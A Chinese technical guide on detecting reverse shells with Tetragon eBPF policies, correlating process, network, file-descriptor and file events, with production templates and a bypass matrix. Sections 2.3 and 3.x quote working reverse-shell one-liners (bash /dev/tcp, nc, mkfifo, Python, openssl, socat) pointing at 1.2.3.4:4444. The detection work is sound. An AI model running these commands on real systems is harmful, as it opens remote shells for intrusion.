# Tetragon 反弹 Shell 检测 — 多维关联与综合防御策略

## 文档定位

本文档是「Tetragon 反弹 Shell 检测全流程深度分析」系列的第 5 篇（终篇），将前 4 个检测维度按具体攻击类型串联，提供生产可用的综合检测方案。

> **前置阅读**:
> - [Doc 0: 基础架构](tetragon-reverse-shell-detection-foundation.md)
> - [Doc 1: 进程执行检测](tetragon-reverse-shell-process-execution-detection.md)
> - [Doc 2: 网络连接检测](tetragon-reverse-shell-network-connection-detection.md)
> - [Doc 3: FD 重定向检测](tetragon-reverse-shell-fd-redirection-detection.md)
> - [Doc 4: 文件访问检测](tetragon-reverse-shell-file-access-detection.md)

---

## 目录

- [第一部分：单维度检测的局限性](#��一部分单维度检测的局限性)
- [第二部分：多维度关联检测策略](#第二部分多维度关联检测策略)
- [第三部分：按攻击类型的完整检测方案](#第三部分按攻击类型的完整检测方案)
- [第四部分：综合防御架构设计](#第四部分综合防御架构设计)
- [第五部分：综合绕过分析与检测边界](#第五部分综合绕过分析与检测边界)

---

## 第一部分：单维度检测的局限性

### 1.1 各维度盲区总结

| 检测维度 | 能检测 | 不能检测（盲区） |
|---------|--------|---------------|
| **进程执行** (Doc 1) | 已知工具的 execve 调用 | 重命名二进制、进程注入、LD_PRELOAD、未知定制后门 |
| **网络连接** (Doc 2) | TCP/UDP 外连 | ICMP/DNS 隧道（需 security_socket_connect）、端口复用误报 |
| **FD 重定向** (Doc 3) | dup2/dup3 到 stdin/stdout | Bash 内建重定向、splice、sendmsg SCM_RIGHTS、PTY |
| **文件访问** (Doc 4) | mkfifo、/tmp 写入、memfd_create | 纯内存操作、非常见路径、O_TMPFILE |

**核心问题**: 单���使用任何一个维度，要么产生大量误报（如网络连接监控），要么存在覆盖盲区（如 FD 重定向无法检测 Bash 内建）。

### 1.2 为什么需要多维关联

多维关联通过同时满足多个条件来提高检测置信度：

```
单维度:
  tcp_connect(外网)  → 误报率高（合法服务也外连）
  dup2(→0/1/2)      → 误报率中（管道操作也用 dup2）
  execve(bash)       → 误报率高（合法 bash 使用）

多维关联:
  同一 PID 在短时间内:
    execve(bash/python/nc)    ← 进程维度
    + tcp_connect(外网IP)      ← 网络维度
    + dup2(socket→0/1/2)      ← FD 维度
    ─────────────────────────
    = 高置信度反弹 Shell 检测 (误报率极低)
```

---

## 第二部分：多维度关联检测策略

### 2.1 进程执行 + 网络连接（同 PID 关联）

**关联维度**: Doc 1 (进程执行) + Doc 2 (网络连接)

**检测逻辑**: 可疑进程（Shell/解释器）启动后发起外网 TCP 连接。

**TracingPolicy**:

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "correlate-exec-network"
spec:
  kprobes:
  # 网络外连检测（可疑进程限定）
  - call: "tcp_connect"
    syscall: false
    args:
    - index: 0
      type: "sock"
    selectors:
    - matchBinaries:
      - operator: "In"
        values:
        - "/usr/bin/bash"
        - "/bin/bash"
        - "/usr/bin/sh"
        - "/bin/sh"
        - "/usr/bin/python3"
        - "/usr/bin/python"
        - "/usr/bin/perl"
        - "/usr/bin/php"
        - "/usr/bin/ruby"
        - "/usr/bin/nc"
        - "/usr/bin/ncat"
        - "/usr/bin/netcat"
        - "/usr/bin/openssl"
        - "/usr/bin/socat"
      matchArgs:
      - index: 0
        operator: "NotDAddr"
        values:
        - "10.0.0.0/8"
        - "172.16.0.0/12"
        - "192.168.0.0/16"
        - "127.0.0.0/8"
        - "169.254.0.0/16"
        - "::1/128"
        - "fe80::/10"
        - "fc00::/7"
```

**用户空间关联**:

```bash
# 进程执行 + 网络外连 → 高置信度告警
tetra getevents -o json | jq '
  select(.process_kprobe.function_name == "tcp_connect")
  | {
      alert: "SUSPICIOUS_OUTBOUND_CONNECTION",
      severity: "HIGH",
      process: .process_kprobe.process.binary,
      pid: .process_kprobe.process.pid.value,
      parent: .process_kprobe.parent.binary,
      args: .process_kprobe.process.arguments,
      daddr: .process_kprobe.args[0].sock_arg.daddr,
      dport: .process_kprobe.args[0].sock_arg.dport,
      protocol: .process_kprobe.args[0].sock_arg.protocol
    }'
```

### 2.2 网络连接 + FD 重定向（最高置信度信号）

**关联维度**: Doc 2 (网络连接) + Doc 3 (FD 重定向)

**检测逻辑**: 进程建立外网连接后，将 socket FD 重定向到 stdin/stdout/stderr。这是反弹 Shell 的最核心行为特征。

**TracingPolicy**:

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "correlate-network-fd"
spec:
  kprobes:
  # 1. 网络外连检测
  - call: "tcp_connect"
    syscall: false
    args:
    - index: 0
      type: "sock"
    selectors:
    - matchArgs:
      - index: 0
        operator: "NotDAddr"
        values:
        - "10.0.0.0/8"
        - "172.16.0.0/12"
        - "192.168.0.0/16"
        - "127.0.0.0/8"

  # 2. FD 重定向到 stdin/stdout/stderr
  - call: "sys_dup2"
    syscall: true
    args:
    - index: 0
      type: "int"     # oldfd
    - index: 1
      type: "int"     # newfd
    selectors:
    - matchArgs:
      - index: 1
        operator: "Equal"
        values:
        - "0"
        - "1"
        - "2"

  - call: "sys_dup3"
    syscall: true
    args:
    - index: 0
      type: "int"
    - index: 1
      type: "int"
    - index: 2
      type: "int"
    selectors:
    - matchArgs:
      - index: 1
        operator: "Equal"
        values:
        - "0"
        - "1"
        - "2"
```

**用户空间关联分析**:

```bash
# 关联同一 PID 的 tcp_connect 和 dup2 事件
tetra getevents -o json | jq '
  if .process_kprobe.function_name == "tcp_connect" then
    {type: "CONNECT",
     pid: .process_kprobe.process.pid.value,
     binary: .process_kprobe.process.binary,
     daddr: .process_kprobe.args[0].sock_arg.daddr,
     dport: .process_kprobe.args[0].sock_arg.dport}
  elif (.process_kprobe.function_name | test("dup[23]")) then
    {type: "DUP_TO_STDIO",
     pid: .process_kprobe.process.pid.value,
     binary: .process_kprobe.process.binary,
     oldfd: .process_kprobe.args[0].int_arg.value,
     newfd: .process_kprobe.args[1].int_arg.value}
  else empty end'

# 同一 PID 出现 CONNECT + DUP_TO_STDIO → 确认反弹 Shell
```

### 2.3 进程执行 + 文件访问 + FD 重定向（管道链检测）

**关联维度**: Doc 1 + Doc 3 + Doc 4

**检测逻辑**: 检测 mkfifo 管道链反弹 Shell 的完整行为。

```
攻击命令: mkfifo /tmp/f; nc 1.2.3.4 4444 < /tmp/f | /bin/sh > /tmp/f

内核行为序列:
  1. mknodat("/tmp/f", S_IFIFO)     ← 文件维度：mkfifo 创建
  2. execve("/usr/bin/nc")          ← 进程维度：nc 启动
  3. execve("/bin/sh")              ← 进程维度：shell 启动
  4. tcp_connect(1.2.3.4:4444)      ← 网络维度：外连
  5. open("/tmp/f", O_RDONLY)       ← 文件维度：读取 FIFO
```

**TracingPolicy**:

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "detect-pipe-chain"
spec:
  kprobes:
  # 1. 检测 mkfifo 创建
  - call: "sys_mknodat"
    syscall: true
    args:
    - index: 1
      type: "string"
    - index: 2
      type: "int"
    selectors:
    - matchArgs:
      - index: 2
        operator: "Mask"
        values:
        - "4096"          # S_IFIFO

  # 2. 检测 nc 外连
  - call: "tcp_connect"
    syscall: false
    args:
    - index: 0
      type: "sock"
    selectors:
    - matchBinaries:
      - operator: "In"
        values:
        - "/usr/bin/nc"
        - "/usr/bin/ncat"
        - "/usr/bin/netcat"
      matchArgs:
      - index: 0
        operator: "NotDAddr"
        values:
        - "127.0.0.0/8"
        - "10.0.0.0/8"
        - "172.16.0.0/12"
        - "192.168.0.0/16"
```

### 2.4 进程树 + 网络（APT 级检测）

**关联维度**: 进程树异常 + 网络外连

**检测逻辑**: Web 服务器进程树中出现 Shell/解释器，且该进程发起外网连接。这是典型的 Webshell → 反弹 Shell 攻击链。

```bash
# APT 级检测: Web 服务器 → 解释器 → Shell → 外连
tetra getevents -o json | jq '
  select(.process_kprobe.function_name == "tcp_connect")
  | select(.process_kprobe.process.binary | test("(bash|sh|python|perl|php|nc)$"))
  | select(.process_kprobe.parent.binary | test("(nginx|apache|httpd|tomcat|java|node)")
           // (.process_kprobe.process.binary | test("(python|perl|php)$")))
  | {
      alert: "APT_WEBSHELL_REVERSE_SHELL",
      severity: "CRITICAL",
      shell: .process_kprobe.process.binary,
      pid: .process_kprobe.process.pid.value,
      parent: .process_kprobe.parent.binary,
      daddr: .process_kprobe.args[0].sock_arg.daddr,
      dport: .process_kprobe.args[0].sock_arg.dport
    }'
```

---

## 第三部分：按攻击类型的完整检测方案

### 3.1 Bash 反弹 Shell

**攻击命令**: `bash -i >& /dev/tcp/1.2.3.4/4444 0>&1`

**全维度检测**:

| 维度 | 检测信号 | 置信度 |
|------|---------|--------|
| 进程执行 | `execve("/usr/bin/bash")` + 参数含 `/dev/tcp` | 高 |
| 网络连接 | `tcp_connect(1.2.3.4:4444)` from bash | 中-高 |
| FD 重定向 | Bash 内建处理（可能不触发 dup2） | 低 |
| 文件访问 | `/dev/tcp` 不是真实文件，Bash 内建处理 | 低 |

**最优策略**: 进程执行（参数匹配 `/dev/tcp`）+ 网络连接

```yaml
# Bash 反弹 Shell 综合检测
kprobes:
- call: "tcp_connect"
  syscall: false
  args:
  - index: 0
    type: "sock"
  selectors:
  - matchBinaries:
    - operator: "In"
      values:
      - "/usr/bin/bash"
      - "/bin/bash"
    matchArgs:
    - index: 0
      operator: "NotDAddr"
      values:
      - "10.0.0.0/8"
      - "172.16.0.0/12"
      - "192.168.0.0/16"
      - "127.0.0.0/8"
    matchActions:
    - action: Sigkill      # Enforce 模式下杀死进程
```

### 3.2 Netcat 反弹 Shell

#### 3.2.1 nc -e 模式

**攻击命令**: `nc -e /bin/sh 1.2.3.4 4444`

| 维度 | 检测信号 | 置信度 |
|------|---------|--------|
| 进程执行 | `execve("/usr/bin/nc")` | 中 |
| 网络连接 | `tcp_connect(1.2.3.4:4444)` from nc | 高 |
| FD 重定向 | nc 内部处理，不触发 dup2 | 不可检测 |
| 文件访问 | 无文件操作 | 不可检测 |

**策略**: matchBinaries(nc/ncat/netcat) + NotDAddr

#### 3.2.2 mkfifo 模式

**攻击命令**: `mkfifo /tmp/f; nc 1.2.3.4 4444 < /tmp/f | /bin/sh > /tmp/f`

| 维度 | 检测信号 | 置信度 |
|------|---------|--------|
| 进程执行 | `execve("/usr/bin/nc")` + `execve("/bin/sh")` | 中 |
| 网络连接 | `tcp_connect(1.2.3.4:4444)` from nc | 高 |
| FD 重定向 | Shell 管道操作 | 低 |
| 文件访问 | `mknodat("/tmp/f", S_IFIFO)` | 高 |

**策略**: mkfifo 检测 + nc 外连检测

### 3.3 Python/Perl/PHP 反弹 Shell

**Python 攻击命令**:
```python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("1.2.3.4",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

| 维度 | 检测信号 | 置信度 |
|------|---------|--------|
| 进程执行 | `execve("/usr/bin/python3")` + 参数含 `socket` | 高 |
| 网络连接 | `tcp_connect(1.2.3.4:4444)` from python3 | 高 |
| FD 重定向 | `dup2(socket_fd, 0/1/2)` 三次调用 | 高 |
| 文件访问 | 无 | 不可检测 |

**策略**: 三维度联合 — 这是最适合多维关联检测的场景。

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "detect-scripting-reverse-shell-full"
spec:
  kprobes:
  # 网络外连
  - call: "tcp_connect"
    syscall: false
    args:
    - index: 0
      type: "sock"
    selectors:
    - matchBinaries:
      - operator: "In"
        values:
        - "/usr/bin/python3"
        - "/usr/bin/python"
        - "/usr/bin/perl"
        - "/usr/bin/php"
        - "/usr/bin/ruby"
      matchArgs:
      - index: 0
        operator: "NotDAddr"
        values:
        - "10.0.0.0/8"
        - "172.16.0.0/12"
        - "192.168.0.0/16"
        - "127.0.0.0/8"

  # FD 重定向
  - call: "sys_dup2"
    syscall: true
    args:
    - index: 0
      type: "int"
    - index: 1
      type: "int"
    selectors:
    - matchArgs:
      - index: 1
        operator: "Equal"
        values:
        - "0"
        - "1"
        - "2"
      matchBinaries:
      - operator: "In"
        values:
        - "/usr/bin/python3"
        - "/usr/bin/python"
        - "/usr/bin/perl"
        - "/usr/bin/php"
```

### 3.4 OpenSSL/Socat 加密反弹 Shell

**攻击命���**:
```bash
# OpenSSL
openssl s_client -quiet -connect 1.2.3.4:4444 | /bin/sh 2>&1 | openssl s_client -quiet -connect 1.2.3.4:4445

# Socat
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:1.2.3.4:4444
```

| 维度 | 检测信号 | 置信度 |
|------|---------|--------|
| 进程执行 | `execve("/usr/bin/openssl")` 或 `execve("/usr/bin/socat")` | 中 |
| 网络连接 | `tcp_connect(1.2.3.4:4444)` | 高（但内容加密不可查） |
| FD 重定向 | openssl/socat 内部处理 | 不可检测 |
| 文件访问 | 无 | 不可检测 |

**策略**: 进程匹配 + 网络连接（元数据级检测）

```yaml
# 加密反弹 Shell 检测
kprobes:
- call: "tcp_connect"
  syscall: false
  args:
  - index: 0
    type: "sock"
  selectors:
  - matchBinaries:
    - operator: "In"
      values:
      - "/usr/bin/openssl"
      - "/usr/bin/socat"
      - "/usr/local/bin/socat"
      - "/usr/bin/ncat"       # ncat --ssl
    matchArgs:
    - index: 0
      operator: "NotDAddr"
      values:
      - "10.0.0.0/8"
      - "172.16.0.0/12"
      - "192.168.0.0/16"
      - "127.0.0.0/8"
```

### 3.5 Memfd 无文件反弹 Shell

| 维度 | 检测信号 | 置信度 |
|------|---------|--------|
| 进程执行 | `i_nlink == 0`（无文件执行标记） | 高 |
| 网络连接 | `tcp_connect(外网)` | 高 |
| FD 重定向 | 取决于实现 | 中 |
| 文件访问 | `memfd_create()` 调用 | 高 |

**策略**: memfd_create + i_nlink==0 + tcp_connect

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "detect-memfd-reverse-shell"
spec:
  kprobes:
  # 1. 检测 memfd_create
  - call: "sys_memfd_create"
    syscall: true
    args:
    - index: 0
      type: "string"
    - index: 1
      type: "int"

  # 2. 检测外连（全进程）
  - call: "tcp_connect"
    syscall: false
    args:
    - index: 0
      type: "sock"
    selectors:
    - matchArgs:
      - index: 0
        operator: "NotDAddr"
        values:
        - "10.0.0.0/8"
        - "172.16.0.0/12"
        - "192.168.0.0/16"
        - "127.0.0.0/8"
```

### 3.6 高级/定制反弹 Shell 检测思路

对于用 C/Go/Rust 编写的定制反弹 Shell：

- **进程执行**: 未知二进制，无法通过路径匹配
- **网络连接**: 仍需 tcp_connect → **可检测**
- **FD 重定向**: 如果使用 dup2 → **可检测**
- **文件访问**: 如果使用 memfd_create → **可检测**

**策略**: 基于行为而非签名的检测

```yaml
# 检测任何进程的 dup2(→0/1/2) + 外网连接
# 不依赖 matchBinaries，纯���为检测
kprobes:
- call: "sys_dup2"
  syscall: true
  args:
  - index: 0
    type: "int"
  - index: 1
    type: "int"
  selectors:
  - matchArgs:
    - index: 1
      operator: "Equal"
      values:
      - "0"
      - "1"
      - "2"
```

---

## 第四部分：综合防御架构设计

### 4.1 分层防御策略

```
┌─────────────────────────────────────────────────────┐
│  第 4 层：全面覆盖（高开销、最高覆盖率）              │
│  ├─ security_socket_connect（全协议）                │
│  ├─ sys_dup/dup2/dup3/fcntl（全 FD 操作）           │
│  ├─ fd_install + FollowFD + CopyFD（FD 跟踪）       │
│  ├─ memfd_create、mknodat（文件操作）                │
│  └─ 进程树深度分析                                    │
├─────────────────────────────────────────���───────────┤
│  第 3 层：标准覆盖（中等开销）                         │
│  ├─ tcp_connect + NotDAddr（外连检测）                │
│  ├─ sys_dup2 + matchArgs(newfd==0/1/2)              │
│  ├─ matchBinaries（Shell/解释器/nc）                  │
│  └─ inet_csk_listen_start（端口监听）                 │
├─────────────────────────────────────────────────────┤
│  第 2 层：基础检测（低开销）                           │
│  ├─ tcp_connect + matchBinaries（可疑进程外连）       │
│  ├─ Execve 事件（参数关键字匹配）                     │
│  └─ i_nlink == 0（无文件执行）                        │
├─────────────────────────────────────────────────────┤
│  第 1 层：最小检测（最低开销）                         │
│  ├─ Execve 事件（仅观察）                             │
│  └─ tcp_connect（仅记录，不过滤）                     │
└─────────────────────────────────────────────────────┘
```

### 4.2 性能考量

#### 4.2.1 BPF Overhead

| Hook 点 | 每次开销 | 触发频率 | 总体影响 |
|---------|---------|---------|---------|
| Execve Tracepoint | ~5μs | 低（仅 exec） | 极低 |
| tcp_connect | ~2μs | 中（每次 TCP 连接） | 低 |
| inet_csk_listen_start | ~2μs | 低（仅 listen） | 极低 |
| security_socket_connect | ~3μs | 高（每次 connect） | 中 |
| sys_dup2/dup3 | ~2μs | 中 | 低 |
| fd_install | ~3μs | 高（每次文件打开） | 中-高 |
| security_file_permission | ~3μs | 极高（每次读写） | 高 |

#### 4.2.2 优化策略

**RateLimit**: 对高频事件使用速率限制

```yaml
matchActions:
- action: Post
  rateLimit: 60000          # 每 60 秒最多 1 个事件
  rateLimitScope: "process"  # 按进程限速
```

**NoPost**: 对仅用于跟踪（FollowFD/TrackSock）的事件不发送到用户空间

```yaml
matchActions:
- action: "FollowFD"
  argFd: 0
  argName: 1
- action: "NoPost"          # 不发送事件，仅记录 FD 映射
```

**matchBinaries**: 缩小监控范围到感兴趣的进程

```yaml
matchBinaries:
- operator: "In"
  values:
  - "/usr/bin/bash"
  - "/usr/bin/nc"
  # 仅监控这些进程，其他进程不触发过滤
```

### 4.3 生产环境策略模板

#### 4.3.1 最小配置（适用于所有环境）

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "reverse-shell-minimal"
spec:
  kprobes:
  # 仅监控可疑进程的 TCP 外连
  - call: "tcp_connect"
    syscall: false
    args:
    - index: 0
      type: "sock"
    selectors:
    - matchBinaries:
      - operator: "In"
        values:
        - "/usr/bin/bash"
        - "/bin/bash"
        - "/usr/bin/sh"
        - "/bin/sh"
        - "/usr/bin/nc"
        - "/usr/bin/ncat"
        - "/usr/bin/python3"
        - "/usr/bin/perl"
        - "/usr/bin/php"
      matchArgs:
      - index: 0
        operator: "NotDAddr"
        values:
        - "10.0.0.0/8"
        - "172.16.0.0/12"
        - "192.168.0.0/16"
        - "127.0.0.0/8"
```

#### 4.3.2 标准配置（推荐）

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "reverse-shell-standard"
spec:
  kprobes:
  # 1. 可疑进程 TCP 外连
  - call: "tcp_connect"
    syscall: false
    args:
    - index: 0
      type: "sock"
    selectors:
    - matchBinaries:
      - operator: "In"
        values:
        - "/usr/bin/bash"
        - "/bin/bash"
        - "/usr/bin/sh"
        - "/bin/sh"
        - "/usr/bin/nc"
        - "/usr/bin/ncat"
        - "/usr/bin/netcat"
        - "/usr/bin/python3"
        - "/usr/bin/python"
        - "/usr/bin/perl"
        - "/usr/bin/php"
        - "/usr/bin/ruby"
        - "/usr/bin/openssl"
        - "/usr/bin/socat"
      matchArgs:
      - index: 0
        operator: "NotDAddr"
        values:
        - "10.0.0.0/8"
        - "172.16.0.0/12"
        - "192.168.0.0/16"
        - "127.0.0.0/8"
        - "169.254.0.0/16"

  # 2. FD 重定向到 stdin/stdout/stderr
  - call: "sys_dup2"
    syscall: true
    args:
    - index: 0
      type: "int"
    - index: 1
      type: "int"
    selectors:
    - matchArgs:
      - index: 1
        operator: "Equal"
        values:
        - "0"
        - "1"
        - "2"
      matchBinaries:
      - operator: "In"
        values:
        - "/usr/bin/bash"
        - "/bin/bash"
        - "/usr/bin/python3"
        - "/usr/bin/perl"
        - "/usr/bin/php"

  # 3. 可疑端口监听
  - call: "inet_csk_listen_start"
    syscall: false
    args:
    - index: 0
      type: "sock"
    selectors:
    - matchArgs:
      - index: 0
        operator: "SPort"
        values:
        - "4444"
        - "8888"
        - "1337"
        - "31337"
        - "9001"
        - "5555"

  # 4. mkfifo 检测
  - call: "sys_mknodat"
    syscall: true
    args:
    - index: 1
      type: "string"
    - index: 2
      type: "int"
    selectors:
    - matchArgs:
      - index: 2
        operator: "Mask"
        values:
        - "4096"

  # 5. memfd_create 检测
  - call: "sys_memfd_create"
    syscall: true
    args:
    - index: 0
      type: "string"
    - index: 1
      type: "int"
```

#### 4.3.3 全面配置（高安全环境）

在标准配置基础上增加：

```yaml
  # 追加到标准配置的 kprobes 列表中

  # 6. 全协议连接监控
  - call: "security_socket_connect"
    syscall: false
    args:
    - index: 0
      type: "socket"
    - index: 1
      type: "sockaddr"
    selectors:
    - matchArgs:
      - index: 1
        operator: "Family"
        values:
        - "AF_INET"
        - "AF_INET6"
      - index: 1
        operator: "NotSAddr"
        values:
        - "10.0.0.0/8"
        - "172.16.0.0/12"
        - "192.168.0.0/16"
        - "127.0.0.0/8"

  # 7. FD 跟踪（FollowFD + CopyFD）
  - call: "fd_install"
    syscall: false
    args:
    - index: 0
      type: "int"
    - index: 1
      type: "file"
    selectors:
    - matchActions:
      - action: "FollowFD"
        argFd: 0
        argName: 1
      - action: "NoPost"

  # 8. 敏感文件访问
  - call: "security_file_permission"
    syscall: false
    return: true
    args:
    - index: 0
      type: "file"
    - index: 1
      type: "int"
    returnArg:
      index: 0
      type: "int"
    returnArgAction: "Post"
    selectors:
    - matchArgs:
      - index: 0
        operator: "Prefix"
        values:
        - "/etc/shadow"
        - "/root/.ssh/"
      - index: 1
        operator: "Equal"
        values:
        - "4"
```

### 4.4 Enforcement 策略

从监控到阻断的渐进响应策略：

```
阶段 1: Monitor（默认）
  ├─ 收集所有事件
  ├─ 建立正常行为基线
  └─ 手动分析告警

阶段 2: Alert
  ├─ 高置信度事件触发告警
  ├─ 关联分析自动化
  └─ 人工确认后处置

阶段 3: Block
  ├─ 已确认的攻击模式自动阻断
  ├─ 使用 Sigkill 杀死反弹 Shell 进程
  └─ 使用 NotifyEnforcer 阻止 dup2 系统调用
```

**Enforce 模式启用**:

```yaml
# 策略级别的模式控制
# 通过 Helm values 或 Tetragon 配置设置
# enforce-mode: true  → Sigkill/Override/NotifyEnforcer 生效
# enforce-mode: false → 仅记录（Monitor 模式）
```

---

## 第五部分：综合绕过分析与检测边界

### 5.1 绕过矩阵

| 绕过技术 | 进程执行 | 网络连接 | FD 重定向 | 文件访问 | 综合可检测 |
|---------|:---:|:---:|:---:|:---:|:---:|
| 二进制重命名 | ❌ 绕过 | ✅ 可检测 | ✅ 可检测 | — | ✅ |
| LD_PRELOAD 注入 | ❌ 绕过 | ✅ 可检测 | ✅ 可检测 | — | ✅ |
| Busybox 多调用 | ❌ 绕过 | ✅ 可检测 | ✅ 可检测 | — | ✅ |
| UDP 反弹 Shell | — | ⚠️ 需 security_socket_connect | ✅ 可检测 | — | ✅ |
| ICMP 隧道 | — | ⚠️ 需 RAW socket 监控 | ❌ | — | ⚠️ |
| DNS 隧道 | — | ⚠️ 间接 | ❌ | — | ⚠️ |
| Bash 内建 /dev/tcp | ✅ 参数匹配 | ✅ 可检测 | ⚠️ 内��� | ⚠️ | ✅ |
| sendmsg SCM_RIGHTS | — | ✅ 可检测 | ❌ 绕过 dup2 | — | ✅ |
| splice() | — | ✅ 可检测 | ❌ 绕过 dup2 | — | ✅ |
| PTY 层 | — | ✅ 可检测 | ❌ 绕过 dup2 | — | ✅ |
| memfd_create | ⚠️ i_nlink=0 | ✅ 可检测 | ✅ 可检测 | ✅ memfd | ✅ |
| 定制 C/Go 后门 | ❌ 未知二进制 | ✅ 可检测 | ✅ 如果用 dup2 | ❌ | ✅ |
| 端口复用 (80/443) | — | ⚠️ 端口过滤失效 | ✅ 可检测 | — | ✅ |
| 内核模块后门 | ❌ | ❌ | ❌ | ❌ | ❌ |

**关键发现**: 网络连接维度几乎无法被绕过（除非使用内核模块级后门），这使其成为最可靠的基础检测层。

### 5.2 Tetragon 检测能力边界

#### 5.2.1 能检测

- ✅ 所有基于 TCP/UDP 的反弹 Shell（通过 tcp_connect / security_socket_connect）
- ✅ 使用 dup2/dup3 的 FD 重定向
- ✅ 已知工具的 execve 调用（通过 matchBinaries + matchArgs）
- ✅ mkfifo 管道链
- ✅ memfd_create 无文件执行
- ✅ 进程树异常（Web 服务器→Shell）
- ✅ 可疑端口监听
- ✅ 敏感文件访问（信息收集阶段）
- ✅ 符号链接/硬链接创建

#### 5.2.2 不能/难以检测

- ❌ 内核模块级后门（绕过所有 eBPF Hook）
- ❌ eBPF 程序篡改（需要额外的 eBPF 完整性保护）
- ⚠️ 纯 ICMP/DNS 隧道（需要专门的 Hook 点）
- ⚠️ 合法进程内的代码注入（如通过 ptrace，难以与正常行为区分）
- ⚠️ 使用已有的合法服务通道（如通过 Web 应用的 HTTP 请求/响应传输命令）
- ⚠️ 非常慢速的数据传输（可能绕过速率检测）

### 5.3 与其他安全工具互补

| 安全工具 | 覆盖层面 | Tetragon 互补点 |
|---------|---------|----------------|
| **Seccomp** | 系统调用白名单 | Tetragon 提供更细粒度的参数过滤（Seccomp 只能过滤系统调用号） |
| **AppArmor/SELinux** | MAC 策略 | Tetragon 提供实时可观测性和动态策略，MAC 提供静态强制 |
| **网络 IDS (Suricata/Snort)** | 网络流量分析 | Tetragon 提供进程级关联，IDS 提供内容级检测（包括加密流量的 JA3 指纹） |
| **HIDS (OSSEC/Wazuh)** | 日志分析 | Tetragon 提供实时内核级检测，HIDS 提供日志级审计 |
| **容器运行时安全 (Falco)** | 系统调用审计 | 类似定位但 Tetragon 基于 eBPF，Falco 基于内核模块/eBPF，各有实现特点 |
| **EDR** | 端点检测响应 | Tetragon 专注于 Linux/容器环境，EDR 通常覆盖更广的操作系统 |

**推荐组合**:
- **最小组合**: Tetragon + Seccomp
- **标准组合**: Tetragon + AppArmor/SELinux + 网络 IDS
- **全面组合**: Tetragon + MAC + 网络 IDS + HIDS + EDR

---

## 附录：完整用户空间关联分析脚本

```bash
#!/bin/bash
# reverse-shell-detector.sh
# 使用 tetra getevents 实时检测反弹 Shell

tetra getevents -o json | jq --unbuffered '
  # 分类事件
  if .process_kprobe != null then
    .process_kprobe as $kp |

    # TCP 外连事件
    if $kp.function_name == "tcp_connect" then
      {
        type: "OUTBOUND_CONNECTION",
        time: .time,
        pid: $kp.process.pid.value,
        binary: $kp.process.binary,
        parent: ($kp.parent.binary // "unknown"),
        daddr: $kp.args[0].sock_arg.daddr,
        dport: $kp.args[0].sock_arg.dport,
        action: $kp.action
      }

    # FD 重定向事件
    elif ($kp.function_name | test("dup[23]?$")) then
      {
        type: "FD_REDIRECT",
        time: .time,
        pid: $kp.process.pid.value,
        binary: $kp.process.binary,
        oldfd: $kp.args[0].int_arg.value,
        newfd: $kp.args[1].int_arg.value,
        alert: (if $kp.args[1].int_arg.value <= 2 then "STDIO_REDIRECT" else "normal" end)
      }

    # mkfifo 事件
    elif $kp.function_name == "sys_mknodat" then
      {
        type: "MKFIFO",
        time: .time,
        pid: $kp.process.pid.value,
        binary: $kp.process.binary,
        path: $kp.args[1].string_arg
      }

    # memfd_create 事件
    elif $kp.function_name == "sys_memfd_create" then
      {
        type: "MEMFD_CREATE",
        time: .time,
        pid: $kp.process.pid.value,
        binary: $kp.process.binary,
        name: $kp.args[0].string_arg
      }

    # 监听事件
    elif $kp.function_name == "inet_csk_listen_start" then
      {
        type: "LISTEN",
        time: .time,
        pid: $kp.process.pid.value,
        binary: $kp.process.binary,
        sport: $kp.args[0].sock_arg.sport
      }

    else empty end

  # 无文件执行事件
  elif .process_exec != null then
    if .process_exec.process.binary_properties.file.inode.links == 0 then
      {
        type: "FILELESS_EXEC",
        time: .time,
        pid: .process_exec.process.pid.value,
        binary: .process_exec.process.binary,
        parent: (.process_exec.parent.binary // "unknown")
      }
    else empty end

  else empty end
'
```
